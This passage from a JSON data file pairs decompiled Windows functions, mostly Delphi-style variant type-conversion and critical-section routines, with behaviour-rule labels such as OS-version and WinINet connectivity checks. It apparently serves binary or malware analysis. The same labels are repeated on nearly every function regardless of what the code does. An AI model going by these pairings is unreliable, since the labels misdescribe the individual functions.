in_stack_ffffffe0 = CONCAT44(0x4140ad, uVar4);\n                fcn.00413be4();\n                break;\n            case 0xb:\n                break;\n            case 0xc:\n                in_stack_ffffffe0 = CONCAT44(0x414146, uVar4);\n                fcn.00413e2c();\n                break;\n            case 0x10:\n                break;\n            case 0x11:\n                break;\n            case 0x12:\n                break;\n            case 0x13:\n                break;\n            case 0x14:\n                fVar3 = fcn.00413cd0(SUB84(**(in_EAX + 4), 0), **(in_EAX + 4) >> 0x20);\n                in_stack_ffffffe0 = fVar3;\n            }\n        }\n        break;\n    case 0xb:\n        break;\n    case 0xc:\n        in_stack_ffffffe0 = CONCAT44(0x413fa8, uVar4);\n        fcn.00413e2c();\n        break;\n    case 0x10:\n        break;\n    case 0x11:\n        break;\n    case 0x12:\n        break;\n    case 0x13:\n        break;\n    case 0x14:\n        fVar3 = fcn.00413cd0(SUB84(*(in_EAX + 4), 0), *(in_EAX + 4) >> 0x20);\n        in_stack_ffffffe0 = fVar3;\n    }\n    return in_stack_ffffffe0;\n}\n",
        "token_count": 1016
    },
    "00414394": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nfloat10 fcn.00414394(void)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint16_t *in_EAX;\n    float10 fVar3;\n    uint uVar4;\n    int64_t in_stack_ffffffe0;\n    \n    uVar1 = *in_EAX;\n    uVar4 = in_stack_ffffffe0;\n    // switch table (21 cases) at 0x4143b0\n    switch(uVar1) {\n    case 0:\n        break;\n    case 1:\n        if (*0x492a5c != '\\0') {\n            in_stack_ffffffe0 = CONCAT44(0x414428, uVar4);\n            fcn.00410e60();\n        }\n        break;\n    case 2:\n        break;\n    case 3:\n        break;\n    case 4:\n    case 5:\n        in_stack_ffffffe0 = CONCAT44(0x414461, uVar4);\n        fcn.00414298();\n        break;\n    case 6:\n        break;\n    case 7:\n        in_stack_ffffffe0 = CONCAT44(0x414483, uVar4);\n        fcn.00414298();\n        break;\n    case 8:\n        in_stack_ffffffe0 = CONCAT44(0x414493, uVar4);\n        fcn.0041417c();\n        break;\n    case 9:\n    case 0xd:\n        in_stack_ffffffe0 = CONCAT44(0x41455a, uVar4);\n        fcn.00414298();\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            in_stack_ffffffe0 = CONCAT44(0x41457a, uVar4);\n            fcn.0041417c();\n        }\n        else if (uVar1 == 0x101) {\n            in_stack_ffffffe0 = CONCAT44(0x41458a, uVar4);\n            fcn.004142e4();\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            in_stack_ffffffe0 = CONCAT44(0x414741, uVar4);\n            cVar2 = fcn.00414348();\n            if (cVar2 == '\\0') {\n                in_stack_ffffffe0 = CONCAT44(0x41474c, in_stack_ffffffe0);\n                fcn.00414298();\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x4145b4\n            switch(uVar1 & 0xbfff) {\n            default:\n                in_stack_ffffffe0 = CONCAT44(0x414732, uVar4);\n                fcn.00414298();\n                break;\n            case 2:\n                break;\n            case 3:\n                break;\n            case 4:\n            case 5:\n                in_stack_ffffffe0 = CONCAT44(0x414637, uVar4);\n                fcn.00414298();\n                break;\n            case 6:\n                break;\n            case 7:\n                in_stack_ffffffe0 = CONCAT44(0x41465b, uVar4);\n                fcn.00414298();\n                break;\n            case 8:\n                in_stack_ffffffe0 = CONCAT44(0x41466b, uVar4);\n                fcn.0041417c();\n                break;\n            case 0xb:\n                break;\n            case 0xc:\n                in_stack_ffffffe0 = CONCAT44(0x414725, uVar4);\n                fcn.00414394();\n                break;\n            case 0x10:\n                break;\n            case 0x11:\n                break;\n            case 0x12:\n                break;\n            case 0x13:\n                break;\n            case 0x14:\n                fVar3 = fcn.00414238(SUB84(**(in_EAX + 4), 0), **(in_EAX + 4) >> 0x20);\n                in_stack_ffffffe0 = ROUND(fVar3);\n            }\n        }\n        break;\n    case 0xb:\n        break;\n    case 0xc:\n        in_stack_ffffffe0 = CONCAT44(0x41454a, uVar4);\n        fcn.00414394();\n        break;\n    case 0x10:\n        break;\n    case 0x11:\n        break;\n    case 0x12:\n        break;\n    case 0x13:\n        break;\n    case 0x14:\n        fVar3 = fcn.00414238(SUB84(*(in_EAX + 4), 0), *(in_EAX + 4) >> 0x20);\n        in_stack_ffffffe0 = ROUND(fVar3);\n    }\n    return in_stack_ffffffe0;\n}\n",
        "token_count": 1058
    },
    "004149c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004149c4(uint param_1, uint *param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint *puStack40;\n    uint pvarg;\n    uint var_14h;\n    int32_t *var_ch;\n    char var_5h;\n    uint *var_4h;\n    \n    if (param_2 != NULL) {\n        *param_2 = 0;\n    }\n    puStack40 = 0x4149e6;\n    var_4h = param_2;\n    var_5h = fcn.00416180();\n    if (var_5h != '\\0') {\n        puStack40 = &fcn.004149c4::pvarg;\n        puStack44 = 0x4149f8;\n        sub.oleaut32.dll_VariantInit();\n        uStack48 = 0x414a39;\n        uStack52 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffcc;\n        puStack44 = &stack0xfffffffc;\n        (**(*var_ch + 0x1c))();\n        fcn.00405584();\n        *in_FS_OFFSET = 0x100;\n        uStack48 = 0x414a40;\n        uStack52 = 0x414a38;\n        uVar1 = fcn.00411644();\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 334
    },
    "00414a4c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00414a4c(uint param_1, uint16_t *param_2)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint *in_FS_OFFSET;\n    float10 fVar3;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = &stack0xfffffffc;\n    var_ch = 0xe;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    var_1ch = 0x414f78;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00414a4c::var_20h;\n    uVar1 = *param_2;\n    // switch table (21 cases) at 0x414a86\n    switch(uVar1) {\n    case 0:\n        var_18h = &stack0xfffffffc;\n        fcn.00405530();\n        break;\n    case 1:\n        var_18h = &stack0xfffffffc;\n        if (*0x492a5c != '\\0') {\n            var_18h = &stack0xfffffffc;\n            fcn.00410e60();\n        }\n        fcn.00405584();\n        break;\n    case 2:\n        var_18h = &stack0xfffffffc;\n        fcn.00409d78();\n        fcn.00405584();\n        break;\n    case 3:\n        var_18h = &stack0xfffffffc;\n        fcn.00409d78();\n        fcn.00405584();\n        break;\n    case 4:\n        fVar3 = *(param_2 + 4);\n        var_2ch = SUB104(fVar3, 0);\n        var_28h = fVar3 >> 0x20;\n        var_24h._0_1_ = fVar3 >> 0x40;\n        var_18h = &stack0xfffffffc;\n        fcn.0040b6e8(var_2ch);\n        fcn.00405584(var_2ch, var_28h, var_24h);\n        break;\n    case 5:\n        fVar3 = *(param_2 + 4);\n        var_2ch = SUB104(fVar3, 0);\n        var_28h = fVar3 >> 0x20;\n        var_24h._0_1_ = fVar3 >> 0x40;\n        var_18h = &stack0xfffffffc;\n        fcn.0040b6e8(var_2ch);\n        fcn.00405584(var_2ch, var_28h, var_24h);\n        break;\n    case 6:\n        var_28h = *(param_2 + 4);\n        var_18h = &stack0xfffffffc;\n        fcn.0041475c(var_28h, *(param_2 + 6));\n        fcn.004057d4();\n        break;\n    case 7:\n        var_28h = *(param_2 + 4);\n        var_18h = &stack0xfffffffc;\n        fcn.00414794(var_28h, *(param_2 + 6));\n        fcn.004057d4();\n        break;\n    case 8:\n        var_18h = &stack0xfffffffc;\n        fcn.00405f58(&fcn.00414a4c::var_1ch);\n        var_28h = 0x414bdf;\n        fcn.004057d4();\n        break;\n    case 9:\n    case 0xd:\n        var_18h = &stack0xfffffffc;\n        fcn.00414894();\n        fcn.00405584();\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            var_18h = &stack0xfffffffc;\n            fcn.00405584();\n        }\n        else if (uVar1 == 0x101) {\n            var_18h = &stack0xfffffffc;\n            fcn.00414960();\n            fcn.00405584();\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            var_18h = &stack0xfffffffc;\n            fcn.00405530();\n            cVar2 = fcn.004149c4();\n            if (cVar2 == '\\0') {\n                fcn.00414894();\n                fcn.00405584();\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x414d0e\n            switch(uVar1 & 0xbfff) {\n            default:\n                var_18h = &stack0xfffffffc;\n                fcn.00414894();\n                fcn.00405584();\n                break;\n            case 2:\n                var_18h = &stack0xfffffffc;\n                fcn.00409d78();\n                fcn.00405584();\n                break;\n            case 3:\n                var_18h = &stack0xfffffffc;\n                fcn.00409d78();\n                fcn.00405584();\n                break;\n            case 4:\n                fVar3 = **(param_2 + 4);\n                var_2ch = SUB104(fVar3, 0);\n                var_28h = fVar3 >> 0x20;\n                var_24h._0_1_ = fVar3 >> 0x40;\n                var_18h = &stack0xfffffffc;\n                fcn.0040b6e8(var_2ch);\n                fcn.00405584(var_2ch, var_28h, var_24h);\n                break;\n            case 5:\n                fVar3 = **(param_2 + 4);\n                var_2ch = SUB104(fVar3, 0);\n                var_28h = fVar3 >> 0x20;\n                var_24h._0_1_ = fVar3 >> 0x40;\n                var_18h = &stack0xfffffffc;\n                fcn.0040b6e8(var_2ch);\n                fcn.00405584(var_2ch, var_28h, var_24h);\n                break;\n            case 6:\n                var_28h = **(param_2 + 4);\n                var_18h = &stack0xfffffffc;\n                fcn.0041475c(var_28h, (*(param_2 + 4))[1]);\n                fcn.004057d4();\n                break;\n            case 7:\n                var_28h = **(param_2 + 4);\n                var_18h = &stack0xfffffffc;\n                fcn.00414794(var_28h, (*(param_2 + 4))[1]);\n                fcn.004057d4();\n                break;\n            case 8:\n                var_18h = &stack0xfffffffc;\n                fcn.00405758();\n                break;\n            case 0xb:\n                var_18h = &stack0xfffffffc;\n                fcn.004147cc();\n                fcn.004057d4();\n                break;\n            case 0xc:\n                var_18h = &stack0xfffffffc;\n                fcn.00414a4c();\n                break;\n            case 0x10:\n                var_18h = &stack0xfffffffc;\n                fcn.00409d78();\n                fcn.00405584();\n                break;\n            case 0x11:\n                var_18h = &stack0xfffffffc;\n                fcn.00409d78();\n                fcn.00405584();\n                break;\n            case 0x12:\n                var_18h = &stack0xfffffffc;\n                fcn.00409d78();\n                fcn.00405584();\n                break;\n            case 0x13:\n                var_28h = **(param_2 + 4);\n                var_18h = &stack0xfffffffc;\n                fcn.00409e64(var_28h);\n                fcn.00405584(var_28h, 0);\n                break;\n            case 0x14:\n                var_24h._0_1_ = (*(param_2 + 4))[1];\n                var_28h = **(param_2 + 4);\n                var_18h = &stack0xfffffffc;\n                fcn.00409e64(var_28h);\n                fcn.00405584(var_28h, var_24h);\n            }\n        }\n        break;\n    case 0xb:\n        var_18h = &stack0xfffffffc;\n        fcn.004147cc();\n        fcn.004057d4();\n        break;\n    case 0xc:\n        var_18h = &stack0xfffffffc;\n        fcn.00414a4c();\n        break;\n    case 0x10:\n        var_18h = &stack0xfffffffc;\n        fcn.00409d78();\n        fcn.00405584();\n        break;\n    case 0x11:\n        var_18h = &stack0xfffffffc;\n        fcn.00409d78();\n        fcn.00405584();\n        break;\n    case 0x12:\n        var_18h = &stack0xfffffffc;\n        fcn.00409d78();\n        fcn.00405584();\n        break;\n    case 0x13:\n        var_28h = *(param_2 + 4);\n        var_18h = &stack0xfffffffc;\n        fcn.00409e64(var_28h);\n        fcn.00405584(var_28h, 0);\n        break;\n    case 0x14:\n        var_24h._0_1_ = *(param_2 + 6);\n        var_28h = *(param_2 + 4);\n        fcn.00409e64(var_28h);\n        fcn.00405584(var_28h, var_24h);\n    }\n    *in_FS_OFFSET = var_28h;\n    var_20h = 0x414f7f;\n    fcn.00405554();\n    fcn.00405d40();\n    fcn.00405554();\n    fcn.00405d40();\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 2562
    },
    "004150a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004150a4(uint param_1, uint *param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint *arg_8h;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_20h;\n    uint pvarg;\n    uint var_14h;\n    int32_t *var_ch;\n    char var_5h;\n    uint *var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    if (param_2 != NULL) {\n        *param_2 = 0;\n    }\n    uStack48 = 0x41515c;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack56 = 0x4150d9;\n    var_4h = param_2;\n    var_5h = fcn.00416180();\n    if (var_5h != '\\0') {\n        puStack56 = &fcn.004150a4::pvarg;\n        puStack60 = 0x4150eb;\n        sub.oleaut32.dll_VariantInit();\n        uStack64 = 0x41513f;\n        uStack68 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffbc;\n        puStack60 = &stack0xfffffffc;\n        (**(*var_ch + 0x1c))(8);\n        arg_8h = var_4h;\n        fcn.00405e6c();\n        fcn.00405f58(arg_8h);\n        *in_FS_OFFSET = arg_8h;\n        uStack68 = 0x415146;\n        fcn.00411644();\n        return;\n    }\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x415163;\n    uStack48 = 0x41515b;\n    fcn.00405d28();\n    return;\n}\n",
        "token_count": 453
    },
    "0041516c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0041516c(uint param_1, uint16_t *param_2)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    float10 fVar4;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uchar *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_14h = &stack0xfffffffc;\n    iVar3 = 0xe;\n    do {\n        var_4h = 0;\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    var_18h = 0x4156b1;\n    var_1ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0041516c::var_1ch;\n    uVar1 = *param_2;\n    // switch table (21 cases) at 0x4151a5\n    switch(uVar1) {\n    case 0:\n        var_14h = &stack0xfffffffc;\n        fcn.00405d28();\n        break;\n    case 1:\n        var_14h = &stack0xfffffffc;\n        if (*0x492a5c != '\\0') {\n            var_14h = &stack0xfffffffc;\n            fcn.00410e60();\n        }\n        fcn.00405ea8();\n        break;\n    case 2:\n        var_14h = &stack0xfffffffc;\n        fcn.00409d78();\n        fcn.00405ea8();\n        break;\n    case 3:\n        var_14h = &stack0xfffffffc;\n        fcn.00409d78();\n        fcn.00405ea8();\n        break;\n    case 4:\n        fVar4 = *(param_2 + 4);\n        var_28h = SUB104(fVar4, 0);\n        var_24h = fVar4 >> 0x20;\n        var_20h._0_1_ = fVar4 >> 0x40;\n        var_14h = &stack0xfffffffc;\n        fcn.0040b6e8(var_28h);\n        fcn.00405ea8(var_28h, var_24h, var_20h);\n        break;\n    case 5:\n        fVar4 = *(param_2 + 4);\n        var_28h = SUB104(fVar4, 0);\n        var_24h = fVar4 >> 0x20;\n        var_20h._0_1_ = fVar4 >> 0x40;\n        var_14h = &stack0xfffffffc;\n        fcn.0040b6e8(var_28h);\n        fcn.00405ea8(var_28h, var_24h, var_20h);\n        break;\n    case 6:\n        var_24h = *(param_2 + 4);\n        var_14h = &stack0xfffffffc;\n        fcn.0041475c(var_24h, *(param_2 + 6));\n        fcn.00405d64();\n        break;\n    case 7:\n        var_24h = *(param_2 + 4);\n        var_14h = &stack0xfffffffc;\n        fcn.00414794(var_24h, *(param_2 + 6));\n        fcn.00405d64();\n        break;\n    case 8:\n        var_24h = 0x4152f1;\n        var_14h = &stack0xfffffffc;\n        fcn.00405f58(in_EAX);\n        break;\n    case 9:\n    case 0xd:\n        var_14h = &stack0xfffffffc;\n        fcn.00414f88();\n        fcn.00405d64();\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            var_14h = &stack0xfffffffc;\n            fcn.00405ea8();\n        }\n        else if (uVar1 == 0x101) {\n            var_14h = &stack0xfffffffc;\n            fcn.00415040();\n            fcn.00405d64();\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            var_14h = &stack0xfffffffc;\n            fcn.00405d28();\n            cVar2 = fcn.004150a4();\n            if (cVar2 == '\\0') {\n                fcn.00414f88();\n                fcn.00405d64();\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x415420\n            switch(uVar1 & 0xbfff) {\n            default:\n                var_14h = &stack0xfffffffc;\n                fcn.00414f88();\n                fcn.00405d64();\n                break;\n            case 2:\n                var_14h = &stack0xfffffffc;\n                fcn.00409d78();\n                fcn.00405ea8();\n                break;\n            case 3:\n                var_14h = &stack0xfffffffc;\n                fcn.00409d78();\n                fcn.00405ea8();\n                break;\n            case 4:\n                fVar4 = **(param_2 + 4);\n                var_28h = SUB104(fVar4, 0);\n                var_24h = fVar4 >> 0x20;\n                var_20h._0_1_ = fVar4 >> 0x40;\n                var_14h = &stack0xfffffffc;\n                fcn.0040b6e8(var_28h);\n                fcn.00405ea8(var_28h, var_24h, var_20h);\n                break;\n            case 5:\n                fVar4 = **(param_2 + 4);\n                var_28h = SUB104(fVar4, 0);\n                var_24h = fVar4 >> 0x20;\n                var_20h._0_1_ = fVar4 >> 0x40;\n                var_14h = &stack0xfffffffc;\n                fcn.0040b6e8(var_28h);\n                fcn.00405ea8(var_28h, var_24h, var_20h);\n                break;\n            case 6:\n                var_24h = **(param_2 + 4);\n                var_14h = &stack0xfffffffc;\n                fcn.0041475c(var_24h, (*(param_2 + 4))[1]);\n                fcn.00405d64();\n                break;\n            case 7:\n                var_24h = **(param_2 + 4);\n                var_14h = &stack0xfffffffc;\n                fcn.00414794(var_24h, (*(param_2 + 4))[1]);\n                fcn.00405d64();\n                break;\n            case 8:\n                var_14h = &stack0xfffffffc;\n                fcn.00405e6c();\n                break;\n            case 0xb:\n                var_14h = &stack0xfffffffc;\n                fcn.004147cc();\n                fcn.00405d64();\n                break;\n            case 0xc:\n                var_14h = &stack0xfffffffc;\n                fcn.0041516c();\n                break;\n            case 0x10:\n                var_14h = &stack0xfffffffc;\n                fcn.00409d78();\n                fcn.00405ea8();\n                break;\n            case 0x11:\n                var_14h = &stack0xfffffffc;\n                fcn.00409d78();\n                fcn.00405ea8();\n                break;\n            case 0x12:\n                var_14h = &stack0xfffffffc;\n                fcn.00409d78();\n                fcn.00405ea8();\n                break;\n            case 0x13:\n                var_24h = **(param_2 + 4);\n                var_14h = &stack0xfffffffc;\n                fcn.00409e64(var_24h);\n                fcn.00405ea8(var_24h, 0);\n                break;\n            case 0x14:\n                var_20h._0_1_ = (*(param_2 + 4))[1];\n                var_24h = **(param_2 + 4);\n                var_14h = &stack0xfffffffc;\n                fcn.00409e64(var_24h);\n                fcn.00405ea8(var_24h, var_20h);\n            }\n        }\n        break;\n    case 0xb:\n        var_14h = &stack0xfffffffc;\n        fcn.004147cc();\n        fcn.00405d64();\n        break;\n    case 0xc:\n        var_14h = &stack0xfffffffc;\n        fcn.0041516c();\n        break;\n    case 0x10:\n        var_14h = &stack0xfffffffc;\n        fcn.00409d78();\n        fcn.00405ea8();\n        break;\n    case 0x11:\n        var_14h = &stack0xfffffffc;\n        fcn.00409d78();\n        fcn.00405ea8();\n        break;\n    case 0x12:\n        var_14h = &stack0xfffffffc;\n        fcn.00409d78();\n        fcn.00405ea8();\n        break;\n    case 0x13:\n        var_24h = *(param_2 + 4);\n        var_14h = &stack0xfffffffc;\n        fcn.00409e64(var_24h);\n        fcn.00405ea8(var_24h, 0);\n        break;\n    case 0x14:\n        var_20h._0_1_ = *(param_2 + 6);\n        var_24h = *(param_2 + 4);\n        fcn.00409e64(var_24h);\n        fcn.00405ea8(var_24h, var_20h);\n    }\n    *in_FS_OFFSET = var_24h;\n    var_1ch = 0x4156b8;\n    fcn.00405d40();\n    fcn.00405554();\n    fcn.00405d40();\n    fcn.00405554();\n    fcn.00405d40();\n    fcn.00405554();\n    fcn.00405d40();\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 2599
    },
    "00415804": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00415804(uint param_1, int16_t *param_2)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    \n    iVar1 = *param_2;\n    if (iVar1 == 0) {\n        fcn.0040700c(param_1);\n    }\n    else if (iVar1 == 1) {\n        if (*0x492a5c != '\\0') {\n            fcn.00410e60();\n        }\n        fcn.0040700c(param_1);\n    }\n    else if (iVar1 == 9) {\n        fcn.00407024();\n    }\n    else if (iVar1 == 0x4009) {\n        fcn.00407024();\n    }\n    else {\n        cVar2 = fcn.00416180();\n        if (cVar2 != '\\0') {\n            fcn.0040700c(param_1);\n            cVar2 = fcn.00404704();\n            if (cVar2 != '\\0') {\n                return;\n            }\n        }\n        fcn.00410e60();\n    }\n    return;\n}\n",
        "token_count": 249
    },
    "004158b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004158b0(char param_1, uint param_2)\n\n{\n    uint16_t *in_EAX;\n    \n    if ((*in_EAX & 0xbfe8) != 0) {\n        fcn.004115c8();\n    }\n    if (*0x492a64 == '\\0') {\n        *in_EAX = 3;\n    }\n    else {\n        *in_EAX = *(param_1 * 2 + 0x492a78);\n    }\n    *(in_EAX + 4) = param_2;\n    return;\n}\n",
        "token_count": 129
    },
    "00415edc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00415edc(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint uStack16;\n    \n    uStack16 = 0x49a994;\n    puStack20 = 0x415ef0;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStack24 = 0x415f3d;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    iVar1 = fcn.0040676c();\n    iVar1 = iVar1 + -1;\n    if (-1 < iVar1) {\n        do {\n            if (*(*0x49a990 + iVar1 * 4) != *0x492a6c) {\n                fcn.00404650();\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != -1);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x415f44;\n    uStack24 = 0x49a994;\n    uStack28 = 0x415f3c;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 283
    },
    "00416180": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __fastcall fcn.00416180(uint param_1, uint *param_2)\n\n{\n    bool bVar1;\n    uint16_t in_AX;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint uStack24;\n    uint var_1h;\n    \n    if (((*0x49a990 == 0) || (in_AX < 0x100)) || (0x7ff < in_AX)) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    if (bVar1) {\n        uStack24 = 0x49a994;\n        puStack28 = 0x4161bb;\n        sub.kernel32.dll_EnterCriticalSection();\n        uStack32 = 0x416228;\n        uStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        puStack28 = &fcn.00416180::var_1h + 1;\n        iVar2 = fcn.0040676c();\n        if (in_AX - 0x100 < iVar2) {\n            *param_2 = *(*0x49a990 + -0x400 + in_AX * 4);\n        }\n        *in_FS_OFFSET = uStack36;\n        puStack28 = 0x41622f;\n        uStack32 = 0x49a994;\n        uStack36 = 0x416227;\n        uVar3 = sub.kernel32.dll_LeaveCriticalSection();\n        return uVar3;\n    }\n    return 0;\n}\n",
        "token_count": 377
    },
    "00416548": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
